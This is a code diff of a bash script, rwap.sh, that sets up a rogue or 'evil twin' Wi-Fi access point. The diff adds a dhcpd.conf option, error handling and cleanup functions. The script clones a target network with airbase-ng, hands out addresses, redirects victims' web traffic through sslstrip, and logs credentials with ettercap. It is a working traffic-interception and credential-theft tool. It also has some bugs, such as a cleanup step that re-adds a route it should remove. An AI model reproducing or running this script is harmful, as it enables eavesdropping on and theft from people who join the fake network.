@@ -13,8 +13,9 @@
 # macchanger and isc-dhcp-server.
 #
 # Usage is:
-#     rwap.sh -i <wireless_interface> [OPTIONS]
-#     -i | --interface <wireless_interface>		-- The interface of the wireless card to be used for mounting the rogue ap
+#     rwap.sh -i <wireless_interface> -d <dhcpd.conf> [OPTIONS]
+#     -i | --interface <wireless_interface>	-- The interface of the wireless card to be used for mounting the rogue ap
+#     -d | --dhcpdconf <dhcpd.conf>	-- The dhcpd.conf configuration file
 #     OPTIONS:
 # 		-h | --help					-- Show this help
 # 		-m | --mode <mode>		-- Mode operation: "normal" (default) and "twin"
@@ -41,6 +42,7 @@ mode=''		# Mode operation
 iface=''		# Wireless interface
 out=''		# Output file
 name=''		# Name of the rogue ap
+dhcpdconf=''	# dhcpd.conf configuration file
 
 # Sizes for the different shells
 shell_1=''
@@ -100,10 +102,21 @@ function disable_network_services()
 function configure_wireless_interface()
 {
   echo '[+] Configuring wireless interface'
-  ifconfig $iface down &> /dev/null
-  new_mac=`echo $(macchanger -r wlan0 | grep New)  |  cut -d' ' -f3`
+  ifconfig $iface down 1>/dev/null
+   if [[ $? != 0 ]]
+  then
+    echo "[--] Could not take down $iface"
+    revert1
+  fi
+  
+  new_mac=`echo $(macchanger -r $iface | grep New)  |  cut -d' ' -f3`
+  if [[ $? != 0 ]]
+  then
+    echo "[--] Could not change mac address"
+    revert1
+  fi
   echo "[++] New mac address is $new_mac"
-  iw reg set BO &> /dev/null
+  iw reg set BO 1> /dev/null
 }
 
 # Configure air* suite
@@ -114,12 +127,21 @@ function start_air_suite()
   local options=''
   
   echo '[+] Starting monitor mode'
-  airmon-ng start wlan0 &> /dev/null
-  
+  mon=`airmon-ng start $iface  | grep "monitor mode enabled on" | awk '{print $5}' | cut -d')' -f1`
+  if [[ $? != 0 ]]
+  then
+    echo '[--] Could not start monitor mode'
+  fi
+    
   if [[ "$mode" == "twin" ]]
   then
     echo '[+] Starting airodump to select target'
-    airodump-ng mon0
+    airodump-ng $mon
+    if [[ $? != 0 ]]
+    then
+      echo '[--] Could not start airodump'
+      revert2
+    fi
     echo '[++] Enter target BSSID: '
     read bssid
     echo '[++] Enter target ESSID: '
@@ -138,35 +160,66 @@ function start_air_suite()
   fi
   
   echo "[+] Starting rogue ap with BSSID $name"
+  exit1=""
   if [ -z $out ]
   then
-    xterm -fn 7x13 -geometry $shell_1 -hold -e "airbase-ng -c 11 $options mon0" &
+    xterm -fn 7x13 -geometry $shell_1 -hold -e "airbase-ng -c 11 $options $mon" &
+    exit1=$?
+    sleep 5
   else
-    airbase-ng -c 11 $options mon0 &> /dev/null &
+    airbase-ng -c 11 $options $mon &> /dev/null &
+    exit1=$?
+    sleep 5
   fi
+  if [[ $exit1 != 0 ]]
+  then
+    echo '[--] Could not start airbase'
+    revert2
+  fi
+    
 }
 
 # Configure rogue ap
 function configure_rogue_ap()
 {
   echo '[+] Configuring rogue ap network settings'
-  ifconfig at0 up &> /dev/null
-  ifconfig at0 10.0.0.1 netmask 255.255.255.0 &> /dev/null
-  ifconfig at0 mtu 1400 &> /dev/null
+  ifconfig at0 up
+  if [[ $? != 0 ]]
+  then
+    echo '[--] Could not take up at0 interface'
+    revert2
+  fi
+  ifconfig at0 10.0.0.1 netmask 255.255.255.0
+  if [[ $? != 0 ]]
+  then
+    echo '[--] Could not configure at0 interface'
+    revert3
+  fi
+  ifconfig at0 mtu 1400
 }
 
 # Add route to system
 function add_route()
 {
   echo '[+] Adding route to system'
-  route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 &> /dev/null
+  route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+  if [[ $? != 0 ]]
+  then
+    echo '[--] Could add route to system'
+    revert3
+  fi
 }
 
 # Enable routing
 function enable_routing()
 {
   echo '[+] Enabling routing'
-  echo "1" > /proc/sys/net/ipv4/ip_forward &> /dev/null
+  echo "1" > /proc/sys/net/ipv4/ip_forward
+  if [[ $? != 0 ]]
+  then
+    echo '[--] Could not enable routing'
+    revert4
+  fi
 }
 
 # Configure iptables
@@ -174,16 +227,16 @@ function configure_iptables()
 {
   echo '[+] Configuring iptables'
   echo '[++] Deleting old tables'
-  iptables --flush &> /dev/null
-  iptables --table nat --flush &> /dev/null
-  iptables --delete-chain &> /dev/null
-  iptables --table nat --delete-chain &> /dev/null
+  iptables --flush
+  iptables --table nat --flush
+  iptables --delete-chain
+  iptables --table nat --delete-chain
 
   echo '[++] Configuring new settings'
-  iptables -P FORWARD ACCEPT &> /dev/null
-  iptables -A FORWARD -i at0 -j ACCEPT &> /dev/null
-  iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE &> /dev/null
-  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 &> /dev/null
+  iptables -P FORWARD ACCEPT
+  iptables -A FORWARD -i at0 -j ACCEPT
+  iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 }
 
 # Start dhcp
@@ -192,10 +245,20 @@ function start_dhcp()
   echo '[+] Starting dhcp server'
   if [ -z $out ]
   then
-    xterm -fn 7x13 -geometry $shell_2 -hold -e "dhcpd -cf ./dhcpd.conf -f -d; /etc/init.d/isc-dhcp-server start" &
+    xterm -fn 7x13 -geometry $shell_2 -hold -e "dhcpd -cf $dhcpdconf -f -d; /etc/init.d/isc-dhcp-server start" &
+    exit1=$?
+    sleep 5
   else
-    dhcpd -cf ./dhcpd.conf -f -d &
-    /etc/init.d/isc-dhcp-server start &> /dev/null &
+    dhcpd -cf $dhcpdconf -f -d &> /dev/null &
+    /etc/init.d/isc-dhcp-server start &> /dev/nul &
+    exit1=$?
+    sleep 5
+  fi
+  
+  if [[ $exit1 != 0 ]]
+  then
+    echo '[--] Could not start dhcp'
+    revert4
   fi
 }
 
@@ -206,8 +269,16 @@ function start_sslstrip()
   if [ -z $out ]
   then
     xterm -fn 7x13 -geometry $shell_3 -hold -e "sslstrip -f -p -k 10000" &
+    exit1=$?
   else
-    sslstrip -f -p -k 10000 &> /dev/null &
+    sslstrip -f -p -k 10000 -w $out &> /dev/null &
+    exit1=$?
+  fi
+  
+  if [[ $exit1 != 0 ]]
+  then
+    echo '[--] Could not start sslstrip'
+    revert5
   fi
 }
 
@@ -218,8 +289,16 @@ function start_ettercap()
   if [ -z $out ]
   then
     xterm -fn 7x13 -geometry $shell_4 -hold -e "ettercap -p -u -T -q -i at0" &
+    exit1=$?
   else
     ettercap -p -u -T -q -i at0 -w $out &
+    exit1=$?
+  fi
+  
+  if [[ $exit1 != 0 ]]
+  then
+    echo '[--] Could not start ettercap'
+    revert6
   fi
 }
 
@@ -228,11 +307,52 @@ function print_help()
 {
     echo 'Usage is rwap.sh -i <wireless_interface> [OPTIONS]'
     echo '-i | --interface <wireless_interface>		-- The interface of the wireless card to be used for mounting the rogue ap'
+    echo '-d | --dhcpdconf <dhcpd.conf>		-- The dhcpd.conf configuration file'
     echo 'OPTIONS:'
     echo '	-h | --help			-- Show this help'
     echo '	-m | --mode <mode>		-- Mode operation: "normal" (default) or "twin"'
     echo '	-n | --name <rogue ap name>	-- Name of the rogue ap'
     echo '	-o | --output <file>		-- Ettercap output file'
+}
+
+function revert1()
+{  
+  ifconfig $iface down &> /dev/null
+  ifconfig $iface up &> /dev/null
+  /etc/init.d/network-manager start &> /dev/null
+  wpa_supplicant dhclient &> /dev/null
+  dhclient &> /dev/null
+  exit 1
+}
+
+function revert2()
+{
+  ifconfig $mon down &> /dev/null
+  revert1
+}
+
+function revert3()
+{
+  ifconfig at0 down &> /dev/null
+  revert2
+}
+
+function revert4()
+{
+   route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 &> /dev/null
+   revert3
+}
+
+function revert5()
+{
+  /etc/init.d/isc-dhcp-server stop 2> /dev/null
+  revert4
+}
+
+function revert6()
+{
+  killall sslstrip
+  revert5
 }
 #################
 # MAIN FUNCTION # 
@@ -249,6 +369,11 @@ else
   while [ -n "$1" ]
   do
     case "$1" in
+    -d | --dhcpdconf)
+      shift
+      dhcpdconf=$1
+      shift
+      ;;
     -h | --help)
       print_help
       exit 0
